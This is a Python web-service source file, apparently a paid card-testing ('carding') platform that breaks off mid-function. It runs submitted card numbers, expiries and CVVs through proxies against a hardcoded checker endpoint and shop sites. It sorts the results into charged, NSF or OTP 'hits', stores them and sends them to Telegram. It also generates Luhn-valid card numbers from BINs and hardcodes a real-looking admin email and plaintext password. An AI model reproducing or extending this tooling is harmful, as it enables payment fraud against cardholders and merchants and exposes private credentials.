# ─────────────────────────────────────────────────────────────────────────────
# 𒉼 𝔢 𝔯 𝔯 𝔬 𝔯 乙  — WEB · v2
# nodes · sites · bin · pretty · categorize · retry
# ─────────────────────────────────────────────────────────────────────────────
import os, sys, json, time, uuid, hmac, hashlib, base64, random, string, sqlite3, threading, asyncio, re
from datetime import datetime, timezone, timedelta
from typing import Optional, List, Dict, Any

import aiohttp
from fastapi import FastAPI, Request, HTTPException, Depends
from fastapi.responses import HTMLResponse, FileResponse
from fastapi.middleware.cors import CORSMiddleware
from pydantic import BaseModel

# ── Config ───────────────────────────────────────────────────────────────────
SECRET_KEY  = os.getenv("SECRET_KEY", "err0r-z-change-me")
DB_PATH     = os.getenv("DB_PATH", "err0r.db")
PORT        = int(os.getenv("PORT", 8000))
ADMIN_EMAIL = "yousafcodes.de@gmail.com"
ADMIN_PASS  = "03283877877@_1"

CHECK_TIMEOUT    = 25
CONNECT_TIMEOUT  = 5
RETRY_ROUNDS     = 2
RETRY_COOLDOWN   = 15
PROBE_INTERVAL   = 30
BIN_CACHE_TTL    = 86400
DUMMY_CC         = "4111111111111111|12|30|123"

# ── DB ───────────────────────────────────────────────────────────────────────
_db_lock = threading.RLock()
_conn: Optional[sqlite3.Connection] = None

def _get_conn():
    global _conn
    if _conn is None:
        os.makedirs(os.path.dirname(DB_PATH) or ".", exist_ok=True)
        _conn = sqlite3.connect(DB_PATH, timeout=30, check_same_thread=False)
        _conn.row_factory = sqlite3.Row
        for p in ("journal_mode=WAL", "synchronous=NORMAL", "busy_timeout=30000"):
            _conn.execute(f"PRAGMA {p}")
    return _conn

def q(sql, params=()):
    with _db_lock:
        return _get_conn().execute(sql, params).fetchall()

def q1(sql, params=()):
    with _db_lock:
        return _get_conn().execute(sql, params).fetchone()

def ex(sql, params=()):
    with _db_lock:
        c = _get_conn().execute(sql, params)
        _get_conn().commit()
        return c.lastrowid or c.rowcount

def _now():
    return datetime.now(timezone.utc).isoformat()

def init_db():
    with _db_lock:
        _get_conn().executescript("""
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            email TEXT UNIQUE NOT NULL,
            password TEXT NOT NULL,
            name TEXT DEFAULT '',
            is_admin INTEGER DEFAULT 0,
            plan TEXT DEFAULT 'free',
            plan_expires TEXT DEFAULT '',
            credits INTEGER DEFAULT 50,
            daily_checks INTEGER DEFAULT 0,
            total_checks INTEGER DEFAULT 0,
            total_hits INTEGER DEFAULT 0,
            last_check_date TEXT DEFAULT '',
            banned INTEGER DEFAULT 0,
            created_at TEXT DEFAULT ''
        );
        CREATE TABLE IF NOT EXISTS settings (key TEXT PRIMARY KEY, value TEXT);
        CREATE TABLE IF NOT EXISTS apis (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT DEFAULT '', url TEXT NOT NULL,
            style TEXT DEFAULT 'params',
            site_required INTEGER DEFAULT 0,
            cap INTEGER DEFAULT 900,
            enabled INTEGER DEFAULT 1,
            api_key TEXT DEFAULT '',
            created_at TEXT DEFAULT ''
        );
        CREATE TABLE IF NOT EXISTS nodes (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            name TEXT DEFAULT '', url TEXT NOT NULL,
            pool TEXT DEFAULT 'vps',
            enabled INTEGER DEFAULT 1,
            status TEXT DEFAULT 'unknown',
            cooldown_until REAL DEFAULT 0,
            workers_busy INTEGER DEFAULT 0,
            workers_cap INTEGER DEFAULT 600,
            avg_rtt_ms REAL DEFAULT 0,
            fail_streak INTEGER DEFAULT 0,
            last_check REAL DEFAULT 0,
            created_at TEXT DEFAULT ''
        );
        CREATE TABLE IF NOT EXISTS sites (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            url TEXT UNIQUE,
            price REAL DEFAULT 0,
            health TEXT DEFAULT 'unknown',
            last_check REAL DEFAULT 0,
            created_at TEXT DEFAULT ''
        );
        CREATE TABLE IF NOT EXISTS proxies (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER NOT NULL, proxy TEXT NOT NULL,
            status TEXT DEFAULT 'unknown', latency REAL DEFAULT 0,
            checked_at TEXT DEFAULT '',
            UNIQUE(user_id, proxy)
        );
        CREATE TABLE IF NOT EXISTS jobs (
            id TEXT PRIMARY KEY,
            user_id INTEGER NOT NULL,
            name TEXT DEFAULT '', status TEXT DEFAULT 'queued',
            phase TEXT DEFAULT 'checking',
            total INTEGER DEFAULT 0, done INTEGER DEFAULT 0,
            charged INTEGER DEFAULT 0, nsf INTEGER DEFAULT 0,
            otp INTEGER DEFAULT 0, declined INTEGER DEFAULT 0, errors INTEGER DEFAULT 0,
            retried INTEGER DEFAULT 0,
            created_at TEXT DEFAULT '', finished_at TEXT DEFAULT ''
        );
        CREATE TABLE IF NOT EXISTS cards (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            job_id TEXT NOT NULL, user_id INTEGER NOT NULL,
            cc TEXT NOT NULL, status TEXT DEFAULT 'pending',
            response TEXT DEFAULT '', raw TEXT DEFAULT '',
            amount REAL DEFAULT 0, currency TEXT DEFAULT 'USD',
            gateway TEXT DEFAULT '', site TEXT DEFAULT '',
            bin_bank TEXT DEFAULT '', bin_country TEXT DEFAULT '',
            bin_flag TEXT DEFAULT '', bin_type TEXT DEFAULT '',
            checked_at TEXT DEFAULT ''
        );
        CREATE TABLE IF NOT EXISTS charged (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER DEFAULT 0,
            cc TEXT, response TEXT, amount REAL, currency TEXT DEFAULT 'USD',
            gateway TEXT, site TEXT,
            bin_bank TEXT DEFAULT '', bin_country TEXT DEFAULT '',
            bin_flag TEXT DEFAULT '', bin_type TEXT DEFAULT '',
            ts TEXT
        );
        CREATE TABLE IF NOT EXISTS redeem_codes (
            code TEXT PRIMARY KEY, plan TEXT, max_uses INTEGER,
            used INTEGER DEFAULT 0, days INTEGER DEFAULT 30
        );
        CREATE TABLE IF NOT EXISTS notifications (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            user_id INTEGER DEFAULT 0, text TEXT, ts TEXT, read INTEGER DEFAULT 0
        );
        """)

        existing = _get_conn().execute("SELECT id FROM users WHERE email=?", (ADMIN_EMAIL,)).fetchone()
        if not existing:
            _get_conn().execute(
                "INSERT INTO users(email,password,name,is_admin,plan,credits,created_at) VALUES (?,?,?,?,?,?,?)",
                (ADMIN_EMAIL, _hash(ADMIN_PASS), "Admin", 1, "unlimited", 999999, _now())
            )
        if not _get_conn().execute("SELECT id FROM apis LIMIT 1").fetchone():
            _get_conn().execute(
                "INSERT INTO apis(name,url,style,site_required,cap,enabled,created_at) VALUES (?,?,?,?,?,?,?)",
                ("default", "http://107.148.78.54:8083/shopify", "raw", 0, 900, 1, _now())
            )
        for k, v in [
            ("bot_token",""), ("admin_chat_id",""),
            ("job_concurrency","15"), ("maintenance","0"),
            ("notify_on_hit","1"), ("site_max_price","3.0"),
        ]:
            _get_conn().execute("INSERT OR IGNORE INTO settings(key,value) VALUES (?,?)", (k, v))
        _get_conn().commit()

# ── Auth ─────────────────────────────────────────────────────────────────────
def _hash(pw):
    return hashlib.pbkdf2_hmac("sha256", pw.encode(), b"err0r-z-static-salt-v1", 120000).hex()

def _verify(pw, hashed):
    return hmac.compare_digest(_hash(pw), hashed)

def _make_token(uid):
    exp = int(time.time()) + 86400 * 30
    payload = f"{uid}.{exp}"
    sig = hmac.new(SECRET_KEY.encode(), payload.encode(), hashlib.sha256).hexdigest()[:32]
    return base64.urlsafe_b64encode(f"{payload}.{sig}".encode()).decode()

def _verify_token(token):
    try:
        raw = base64.urlsafe_b64decode(token.encode()).decode()
        uid, exp, sig = raw.split(".")
        if int(exp) < time.time(): return None
        expected = hmac.new(SECRET_KEY.encode(), f"{uid}.{exp}".encode(), hashlib.sha256).hexdigest()[:32]
        if not hmac.compare_digest(sig, expected): return None
        return int(uid)
    except Exception:
        return None

def _user_from(request: Request):
    auth = request.headers.get("authorization","")
    if not auth.startswith("Bearer "): raise HTTPException(401,"no token")
    uid = _verify_token(auth[7:])
    if not uid: raise HTTPException(401,"bad token")
    row = q1("SELECT * FROM users WHERE id=?", (uid,))
    if not row or row["banned"]: raise HTTPException(401,"banned")
    return dict(row)

def _admin(user=Depends(_user_from)):
    if not user["is_admin"]: raise HTTPException(403,"admin only")
    return user

def _pub_user(r):
    d = dict(r); d.pop("password", None); return d

def _get_setting(k, default=""):
    r = q1("SELECT value FROM settings WHERE key=?", (k,))
    return r["value"] if r else default

def _set_setting(k, v):
    ex("INSERT INTO settings(key,value) VALUES (?,?) ON CONFLICT(key) DO UPDATE SET value=excluded.value", (k, str(v)))

# ── CC utils ─────────────────────────────────────────────────────────────────
CC_RE = re.compile(r"^\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}$")

def normalize_cc(raw):
    if not raw: return None
    s = re.sub(r"[\s:;,/\-]+", "|", raw.strip())
    parts = [p for p in s.split("|") if p]
    if len(parts) != 4: return None
    num, mm, yy, cvv = (re.sub(r"\D","",x) for x in parts)
    if not (num and mm and yy and cvv) or not (13 <= len(num) <= 19): return None
    if len(yy) == 4: yy = yy[2:]
    cc = f"{num}|{mm.zfill(2)[:2]}|{yy.zfill(2)[:2]}|{cvv.zfill(3)[:4]}"
    return cc if CC_RE.match(cc) else None

def luhn_ok(card):
    if not card.isdigit(): return False
    total, rev = 0, card[::-1]
    for i, ch in enumerate(rev):
        d = ord(ch) - 48
        if i % 2 == 1:
            d *= 2
            if d > 9: d -= 9
        total += d
    return total % 10 == 0

def complete_luhn(prefix, length):
    body = prefix + "".join(random.choices(string.digits, k=length-len(prefix)-1))
    for d in "0123456789":
        if luhn_ok(body+d): return body+d
    return body+"0"

def generate_cc(bin_prefix, month, year, cvv, count):
    out = []
    for _ in range(count):
        length = 15 if bin_prefix.startswith(("34","37")) else 16
        num = complete_luhn(bin_prefix or "4", length)
        mm = month if month and month != "random" else f"{random.randint(1,12):02d}"
        yy = year if year and year != "random" else f"{random.randint(26,32):02d}"
        cv = cvv if cvv and cvv != "random" else f"{random.randint(0,999):03d}"
        out.append(f"{num}|{mm}|{yy}|{cv}")
    return out

def country_flag(code):
    if not code or len(code) != 2 or not code.isalpha(): return "🌍"
    return chr(0x1F1E6 + ord(code[0].upper()) - 65) + chr(0x1F1E6 + ord(code[1].upper()) - 65)

# ── Classify ─────────────────────────────────────────────────────────────────
CHARGED_KW = ("ORDER_PLACED","ORDER_PAID","PAYMENT_SUCCESSFULL","PAYMENT_CAPTURED","PAYMENT_COMPLETED","PAYMENT_FULFILLED")
NSF_KW     = ("INSUFFICIENT_FUNDS","NSF","INSUFFICIENT FUNDS")
CCN_KW     = ("INCORRECT_CVC","INVALID_CVC","WRONG_CVV","CVV")
OTP_KW     = ("OTP","3DS","3D_SECURE","3D SECURE","AUTHENTICATION_REQUIRED","OTP_REQUIRED")
DECLINE_KW = ("DECLINED","DECLINE","DO_NOT_HONOR","DO_NOT_HONOUR","GENERIC_DECLINE",
              "FRAUDULENT","SUSPECTED_FRAUD","STOLEN_CARD","LOST_CARD","PICKUP_CARD",
              "EXPIRED_CARD","CARD_EXPIRED","RESTRICTED_CARD","CARD_NOT_SUPPORTED",
              "TRANSACTION_NOT_ALLOWED","NOT_PERMITTED","BLOCKED_CARD","BIN_BLOCKED",
              "INVALID_ACCOUNT","CARD_NOT_ACTIVE","INVALID_NUMBER","INCORRECT_NUMBER",
              "INVALID_CARD","AUTHENTICATION_FAILED","AUTHORIZATION_FAILED")
SITE_ERR_KW = ("NO_PRODUCTS","PRODUCTS_NOT_FOUND","INVALID_SHOP","SITE ERROR","CART FAILED",
               "NO PRODUCT","TIMEOUT","CAPTCHA_REQUIRED","HTTP 429","HTTP 503","HTTP 401","HTTP 403",
               "SITE_REQUIRED","NO_SITE","SITE_MISSING","INVALID_SITE","OUT OF STOCK","UNAVAILABLE")

def classify(body: str, http_status: int = 200):
    raw = (body or "").strip()
    up = raw.upper()
    base = {"response": "", "amount": 0.0, "currency": "USD", "gateway": "", "raw": raw[:4000]}
    if http_status == 429 or "RATE LIMIT" in up or "TOO MANY" in up:
        return {**base, "cls": "error", "response": "rate_limited"}
    if http_status >= 500:
        return {**base, "cls": "error", "response": f"HTTP {http_status}"}
    data = {}
    if raw.startswith(("{","[")):
        try:
            p = json.loads(raw)
            if isinstance(p, list) and p and isinstance(p[0], dict): data = p[0]
            elif isinstance(p, dict): data = p
        except Exception: pass
    charged  = str(data.get("Charged","False")).strip().lower() == "true"
    approved = str(data.get("Approved","False")).strip().lower() == "true"
    resp = str(data.get("Response", data.get("response", data.get("message", data.get("error","")))) or "").strip() or raw[:200] or "unknown"
    gateway = str(data.get("Gate", data.get("Gateway", data.get("gateway",""))) or "").strip()
    price_raw = str(data.get("Price", data.get("price", data.get("amount","0"))) or "0")
    amount, currency = 0.0, "USD"
    pp = price_raw.strip().split()
    if pp:
        try: amount = float(pp[0].replace("$","").replace("?","0"))
        except Exception: pass
        if len(pp) > 1 and pp[1].isalpha(): currency = pp[1].upper()
    ru = resp.upper()
    if charged or any(k in ru for k in CHARGED_KW):
        cls = "charged"
    elif any(k in ru for k in OTP_KW):
        cls = "otp"
    elif any(k in ru for k in NSF_KW):
        cls = "nsf"
    elif any(k in ru for k in CCN_KW):
        cls = "nsf"
    elif any(k in ru for k in SITE_ERR_KW):
        cls = "error"
    elif any(k in ru for k in DECLINE_KW):
        cls = "declined"
    elif approved:
        cls = "nsf"  # approved-but-not-charged = live
    else:
        cls = "error"
    return {**base, "cls": cls, "response": resp[:200], "amount": amount, "currency": currency, "gateway": gateway}

def is_hit(cls): return cls in ("charged","nsf","otp")
def is_retryable(cls): return cls == "error"

# ── BIN lookup ───────────────────────────────────────────────────────────────
_bin_cache: Dict[str, Dict[str, Any]] = {}

async def bin_lookup(bin6: str) -> Dict[str, Any]:
    if not bin6 or len(bin6) < 6: return {"error":"invalid"}
    cached = _bin_cache.get(bin6)
    if cached and time.time() - cached.get("_ts",0) < BIN_CACHE_TTL:
        return cached
    try:
        async with aiohttp.ClientSession() as s:
            async with s.get(f"https://data.handyapi.com/bin/{bin6}", timeout=aiohttp.ClientTimeout(total=8)) as r:
                if r.status != 200: return {"error": f"HTTP {r.status}"}
                data = await r.json()
                if data.get("Status") != "SUCCESS": return {"error":"not found"}
                country = data.get("Country") or {}
                out = {
                    "_ts": time.time(),
                    "bin": bin6,
                    "issuer": data.get("Issuer","N/A"),
                    "country": country.get("Name","N/A"),
                    "country_code": country.get("Code",""),
                    "flag": country_flag(country.get("Code","")),
                    "type": (data.get("Type","N/A") or "N/A").upper(),
                    "scheme": data.get("Scheme","N/A"),
                    "tier": data.get("CardTier","N/A"),
                    "bank_phone": data.get("BankPhone",""),
                    "bank_url": data.get("BankURL",""),
                }
                _bin_cache[bin6] = out
                return out
    except Exception as e:
        return {"error": str(e)[:80]}

# ── Proxy test ───────────────────────────────────────────────────────────────
def _proxy_url(p):
    p = p.strip()
    if "://" in p: return p
    parts = p.split(":")
    if len(parts) == 4: return f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
    return f"http://{p}"

def _proxy_for_node(p):
    """Convert proxy to host:port:user:pass for node clients."""
    p = (p or "").strip()
    if not p: return ""
    p = re.sub(r'^(https?|socks[45])://', '', p)
    if "@" in p:
        creds, hostport = p.rsplit("@", 1)
        parts = hostport.split(":")
        host, port = parts[0], (parts[1] if len(parts) > 1 else "8080")
        cp = creds.split(":", 1)
        user, pw = cp[0], (cp[1] if len(cp) > 1 else "")
        return f"{host}:{port}:{user}:{pw}"
    return p

async def test_proxy(proxy):
    start = time.time()
    try:
        url = _proxy_url(proxy)
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(force_close=True, ssl=False)) as s:
            async with s.get("https://api.ipify.org", proxy=url, timeout=aiohttp.ClientTimeout(total=12)) as r:
                body = await r.text(errors="ignore")
                if r.status == 200 and any(c.isdigit() for c in body):
                    return {"ok": True, "latency": round(time.time()-start, 2)}
                return {"ok": False, "latency": round(time.time()-start, 2)}
    except Exception:
        return {"ok": False, "latency": 0}

# ── Telegram ─────────────────────────────────────────────────────────────────
async def tg_send(text):
    token = _get_setting("bot_token").strip()
    chat = _get_setting("admin_chat_id").strip()
    if not token or not chat: return
    try:
        async with aiohttp.ClientSession() as s:
            await s.post(f"https://api.telegram.org/bot{token}/sendMessage",
                         json={"chat_id":chat,"text":text,"parse_mode":"HTML","disable_web_page_preview":True},
                         timeout=aiohttp.ClientTimeout(total=10))
    except Exception: pass

def _fmt_hit(cc, res, user_email, bin_info=None):
    masked = cc[:6] + "******" + cc[-4:]
    lines = [f"<b>💳 HIT · {res.get('cls','').upper()}</b>", f"<code>{masked}</code>"]
    if bin_info and "error" not in bin_info:
        lines.append(f"🏦 {bin_info.get('issuer','')} · {bin_info.get('flag','')} {bin_info.get('country','')} · {bin_info.get('type','')}")
    lines.extend([
        f"📡 <b>{res.get('response','')}</b>",
        f"💰 <b>${res.get('amount',0):.2f} {res.get('currency','USD')}</b>",
        f"⚙️ {res.get('gateway','') or '—'}",
        f"👤 {user_email}",
    ])
    return "\n".join(lines)

# ── Node pool ────────────────────────────────────────────────────────────────
async def probe_nodes():
    nodes = q("SELECT * FROM nodes WHERE enabled=1")
    if not nodes: return
    async def one(n):
        url = n["url"].rstrip("/") + "/health"
        try:
            async with aiohttp.ClientSession() as s:
                async with s.get(url, timeout=aiohttp.ClientTimeout(total=5), ssl=False) as r:
                    if r.status < 500:
                        try: d = await r.json(content_type=None)
                        except Exception: d = {}
                        ex("UPDATE nodes SET status='live', workers_busy=?, workers_cap=?, fail_streak=0, last_check=?, avg_rtt_ms=? WHERE id=?",
                           (int(d.get("workers_busy",0)), int(d.get("workers_cap",600)), time.time(), n["avg_rtt_ms"], n["id"]))
                        return True
        except Exception: pass
        new_fail = (n["fail_streak"] or 0) + 1
        new_status = "cooldown" if new_fail < 3 else "down"
        cooldown = time.time() + 30 if new_fail < 3 else time.time() + 120
        ex("UPDATE nodes SET status=?, fail_streak=?, cooldown_until=?, last_check=? WHERE id=?",
           (new_status, new_fail, cooldown, time.time(), n["id"]))
        return False
    await asyncio.gather(*[one(n) for n in nodes], return_exceptions=True)

async def node_probe_loop():
    await asyncio.sleep(5)
    while True:
        try:
            await probe_nodes()
        except Exception as e:
            print(f"[probe] {e}", flush=True)
        await asyncio.sleep(PROBE_INTERVAL)

def _pick_node():
    now = time.time()
    nodes = q("SELECT * FROM nodes WHERE enabled=1 AND cooldown_until < ?", (now,))
    if not nodes: return None
    return dict(random.choice(nodes))

def _pick_api(require_site=None):
    sql = "SELECT * FROM apis WHERE enabled=1"
    params = []
    if require_site is not None:
        sql += " AND site_required=?"
        params.append(1 if require_site else 0)
    apis = q(sql, tuple(params))
    return dict(random.choice(apis)) if apis else None

def _pick_site():
    sites = q("SELECT * FROM sites WHERE health != 'down' OR health = 'unknown'")
    return dict(random.choice(sites)) if sites else None

# ── HTTP check ───────────────────────────────────────────────────────────────
async def check_one(card, proxy, node, endpoint, site):
    proxy_url = _proxy_url(proxy) if proxy else None
    node_proxy = _proxy_for_node(proxy) if proxy else ""
    try:
        if node:
            params = card
            if site: params += f"&site={site}"
            if node_proxy: params += f"&proxy={node_proxy}"
            url = f"{node['url'].rstrip('/')}/?{params}"
            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=200, ssl=False)) as s:
                async with s.get(url, proxy=proxy_url,
                                 timeout=aiohttp.ClientTimeout(total=CHECK_TIMEOUT, connect=CONNECT_TIMEOUT, sock_read=CHECK_TIMEOUT-3),
                                 ssl=False) as r:
                    body = await r.text(errors="ignore")
                    res = classify(body, r.status)
                    if r.status >= 500 or (r.status != 200 and res["cls"] == "error"):
                        ex("UPDATE nodes SET fail_streak=fail_streak+1 WHERE id=?", (node["id"],))
                    res["site"] = site or ""
                    return res
        elif endpoint:
            base = endpoint["url"]; style = endpoint.get("style","params"); key = endpoint.get("api_key") or ""
            api_site = site if not site or site.startswith("http") else f"https://{site}"
            if style == "raw":
                parts = [card]
                if proxy: parts.append(f"proxy={proxy}")
                if api_site: parts.append(f"site={api_site}")
                if key: parts.append(f"key={key}")
                sep = "&" if "?" in base else "?"
                url, params = base + sep + "&".join(parts), None
            else:
                url = base
                params = {"cc": card, "proxy": proxy or ""}
                if api_site: params["site"] = api_site
                if key: params["key"] = key
            async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(limit=200, ssl=False)) as s:
                async with s.get(url, params=params, proxy=proxy_url,
                                 timeout=aiohttp.ClientTimeout(total=CHECK_TIMEOUT, connect=CONNECT_TIMEOUT, sock_read=CHECK_TIMEOUT-3)) as r:
                    body = await r.text(errors="ignore")
                    res = classify(body, r.status)
                    res["site"] = site or ""
                    return res
        else:
            return {"cls":"error","response":"no nodes or apis configured","amount":0,"currency":"USD","gateway":"","site":"","raw":""}
    except asyncio.TimeoutError:
        return {"cls":"error","response":"timeout","amount":0,"currency":"USD","gateway":"","site":site or "","raw":""}
    except Exception as e:
        return {"cls":"error","response":str(e)[:120],"amount":0,"currency":"USD","gateway":"","site":site or "","raw":""}

# ── Job runner ───────────────────────────────────────────────────────────────
async def run_job(job_id):
    job = q1("SELECT * FROM jobs WHERE id=?", (job_id,))
    if not job: return
    user = q1("SELECT * FROM users WHERE id=?", (job["user_id"],))
    if not user: return

    cards = q("SELECT * FROM cards WHERE job_id=? ORDER BY id", (job_id,))
    if not cards:
        ex("UPDATE jobs SET status='done', finished_at=? WHERE id=?", (_now(), job_id)); return

    proxies = [r["proxy"] for r in q("SELECT proxy FROM proxies WHERE user_id=? AND status='live'", (user["id"],))]
    concurrency = max(1, int(_get_setting("job_concurrency","15") or 15))
    sem = asyncio.Semaphore(concurrency)
    proxy_idx = [0]
    lock = asyncio.Lock()
    notify = _get_setting("notify_on_hit","1") == "1"

    def next_proxy():
        if not proxies: return None
        p = proxies[proxy_idx[0] % len(proxies)]; proxy_idx[0] += 1; return p

    async def process_card(card_row):
        async with sem:
            node = _pick_node()
            site_req = True if node else None
            endpoint = None if node else _pick_api(require_site=None)
            site = None
            if node or (endpoint and endpoint.get("site_required")):
                s = _pick_site()
                site = s["url"] if s else None
            res = await check_one(card_row["cc"], next_proxy(), node, endpoint, site)
            cls = res["cls"]
            bin_info = None
            if cls in ("charged","nsf","otp"):
                bin_info = await bin_lookup(card_row["cc"][:6])
            async with lock:
                ex("""UPDATE cards SET status=?, response=?, raw=?, amount=?, currency=?, gateway=?, site=?,
                     bin_bank=?, bin_country=?, bin_flag=?, bin_type=?, checked_at=? WHERE id=?""",
                   (cls, res.get("response",""), res.get("raw","")[:4000], res.get("amount",0),
                    res.get("currency","USD"), res.get("gateway",""), res.get("site",""),
                    (bin_info or {}).get("issuer","") if bin_info and "error" not in bin_info else "",
                    (bin_info or {}).get("country","") if bin_info and "error" not in bin_info else "",
                    (bin_info or {}).get("flag","") if bin_info and "error" not in bin_info else "",
                    (bin_info or {}).get("type","") if bin_info and "error" not in bin_info else "",
                    _now(), card_row["id"]))
                col = {"charged":"charged","nsf":"nsf","otp":"otp","declined":"declined","error":"errors"}[cls]
                ex(f"UPDATE jobs SET done=done+1, {col}={col}+1 WHERE id=?", (job_id,))
                if cls == "charged":
                    ex("UPDATE users SET total_hits=total_hits+1 WHERE id=?", (user["id"],))
                if is_hit(cls):
                    ex("INSERT INTO charged(user_id,cc,response,amount,currency,gateway,site,bin_bank,bin_country,bin_flag,bin_type,ts) VALUES (?,?,?,?,?,?,?,?,?,?,?,?)",
                       (user["id"], card_row["cc"], res.get("response",""), res.get("amount",0),
                        res.get("currency","USD"), res.get("gateway",""), res.get("site",""),
                        (bin_info or {}).get("issuer","") if bin_info and "error" not in bin_info else "",
                        (bin_info or {}).get("country","") if bin_info and "error" not in bin_info else "",
                        (bin_info or {}).get("flag","") if bin_info and "error" not in bin_info else "",
                        (bin_info or {}).get("type","") if bin_info and "error" not in bin_info else "",
                        _now()))
                    if notify:
                        asyncio.create_task(tg_send(_fmt_hit(card_row["cc"], res, user["email"], bin_info)))

    await asyncio.gather(*[process_card(c) for c in cards], return_exceptions=True)

    # retry phase — errors only, up to RETRY_ROUNDS
    for round_n in range(1, RETRY_ROUNDS+1):
        error_cards = q("SELECT * FROM cards WHERE job_id=? AND status='error'", (job_id,))
        if not error_cards: break
        ex("UPDATE jobs SET phase='retrying', retried=retried+? WHERE id=?", (len(error_cards), job_id))
        await asyncio.sleep(RETRY_COOLDOWN)
        for card_row in error_cards:
            ex("UPDATE cards SET status='pending' WHERE id=?", (card_row["id"],))
        await asyncio.gather(*[process_card(c) for c in error_cards], return_exceptions=True)

    ex("UPDATE jobs SET status='done', phase='done', finished_at=? WHERE id=?", (_now(), job_id))

async def worker_loop():
    await asyncio.sleep(2)
    while True:
        try:
            job = q1("SELECT id FROM jobs WHERE status='queued' ORDER BY created_at LIMIT 1")
            if job:
                ex("UPDATE jobs SET status='running', phase='checking' WHERE id=?", (job["id"],))
                await run_job(job["id"])
        except Exception as e:
            print(f"[worker] {e}", flush=True)
        await asyncio.sleep(2)

# ── FastAPI ──────────────────────────────────────────────────────────────────
app = FastAPI(title="err0r-z web")
app.add_middleware(CORSMiddleware, allow_origins=["*"], allow_methods=["*"], allow_headers=["*"])

@app.on_event("startup")
async def _startup():
    init_db()
    ex("UPDATE jobs SET status='queued', phase='checking' WHERE status='running'")
    asyncio.create_task(worker_loop())
    asyncio.create_task(node_probe_loop())
    print("[boot] err0r-z web v2 ready", flush=True)

# ── Models ──────────────────────────────────────────────────────────────────
class LoginIn(BaseModel): email: str; password: str
class ProxyIn(BaseModel): proxies: List[str]
class StartIn(BaseModel): cards: List[str]; name: str = ""
class UserCreateIn(BaseModel): email: str; password: str; name: str = ""; plan: str = "free"; credits: int = 50
class UserUpdateIn(BaseModel):
    plan: Optional[str] = None; credits: Optional[int] = None
    banned: Optional[int] = None; password: Optional[str] = None
class ApiIn(BaseModel):
    name: str = ""; url: str; style: str = "params"
    site_required: int = 0; cap: int = 900; api_key: str = ""; enabled: int = 1
class NodeIn(BaseModel):
    name: str = ""; url: str; pool: str = "vps"; enabled: int = 1
class SiteIn(BaseModel): url: str
class CodeIn(BaseModel): plan: str; uses: int; days: int
class SettingIn(BaseModel): key: str; value: str
class NotifyIn(BaseModel): user_id: int = 0; text: str
class RedeemIn(BaseModel): code: str
class GenIn(BaseModel):
    bin: str = "4"; month: str = "random"; year: str = "random"
    cvv: str = "random"; count: int = 10

# ── Routes ──────────────────────────────────────────────────────────────────
@app.get("/", response_class=HTMLResponse)
async def index():
    path = os.path.join(os.path.dirname(__file__), "templates", "index.html")
    if os.path.exists(path): return FileResponse(path, media_type="text/html")
    return HTMLResponse("<h1>template missing</h1>", status_code=500)

@app.post("/api/auth/login")
async def login(body: LoginIn):
    row = q1("SELECT * FROM users WHERE email=?", (body.email.strip().lower(),))
    if not row or not _verify(body.password, row["password"]):
        raise HTTPException(401,"invalid credentials")
    if row["banned"]: raise HTTPException(403,"banned")
    return {"token": _make_token(row["id"]), "user": _pub_user(row)}

@app.get("/api/me")
async def me(user=Depends(_user_from)):
    return _pub_user(q1("SELECT * FROM users WHERE id=?", (user["id"],)))

@app.get("/api/stats")
async def stats(user=Depends(_user_from)):
    jobs = q("SELECT * FROM jobs WHERE user_id=?", (user["id"],))
    return {
        "total": sum(j["total"] for j in jobs),
        "charged": sum(j["charged"] for j in jobs),
        "nsf": sum(j["nsf"] for j in jobs),
        "otp": sum(j["otp"] for j in jobs),
        "declined": sum(j["declined"] for j in jobs),
        "errors": sum(j["errors"] for j in jobs),
    }

@app.get("/api/proxies")
async def list_proxies(user=Depends(_user_from)):
    return [dict(r) for r in q("SELECT * FROM proxies WHERE user_id=? ORDER BY id DESC", (user["id"],))]

@app.post("/api/proxies/validate")
async def validate_proxies(body: ProxyIn, user=Depends(_user_from)):
    existing = {r["proxy"] for r in q("SELECT proxy FROM proxies WHERE user_id=?", (user["id"],))}
    new = [p.strip() for p in body.proxies if p.strip() and p.strip() not in existing]
    if not new: return {"tested":0,"live":0,"dead":0}
    results = await asyncio.gather(*[test_proxy(p) for p in new])
    live = 0
    for p, r in zip(new, results):
        if r["ok"]:
            live += 1
            ex("INSERT OR REPLACE INTO proxies(user_id,proxy,status,latency,checked_at) VALUES (?,?,?,?,?)",
               (user["id"], p, "live", r["latency"], _now()))
    return {"tested": len(new), "live": live, "dead": len(new)-live}

@app.delete("/api/proxies/{pid}")
async def del_proxy(pid: int, user=Depends(_user_from)):
    ex("DELETE FROM proxies WHERE id=? AND user_id=?", (pid, user["id"])); return {"ok": True}

@app.delete("/api/proxies")
async def clear_proxies(user=Depends(_user_from)):
    ex("DELETE FROM proxies WHERE user_id=?", (user["id"],)); return {"ok": True}

@app.post("/api/check/start")
async def start_check(body: StartIn, user=Depends(_user_from)):
    if _get_setting("maintenance","0") == "1" and not user["is_admin"]:
        raise HTTPException(503,"maintenance")
    nodes_avail = q1("SELECT id FROM nodes WHERE enabled=1 LIMIT 1")
    apis_avail = q1("SELECT id FROM apis WHERE enabled=1 LIMIT 1")
    if not nodes_avail and not apis_avail:
        raise HTTPException(400,"no nodes or APIs enabled — ask admin")
    if not user["is_admin"]:
        if not q1("SELECT id FROM proxies WHERE user_id=? AND status='live' LIMIT 1", (user["id"],)):
            raise HTTPException(400,"add and validate proxies first")
    cards, seen = [], set()
    for c in body.cards:
        n = normalize_cc(c)
        if n and n not in seen:
            seen.add(n); cards.append(n)
    if not cards: raise HTTPException(400,"no valid cards")
    if not user["is_admin"]:
        limits = {"free":100,"pro":2000,"premium":5000,"max":10000,"unlimited":20000}
        mass_limit = limits.get(user["plan"],100)
        if len(cards) > mass_limit:
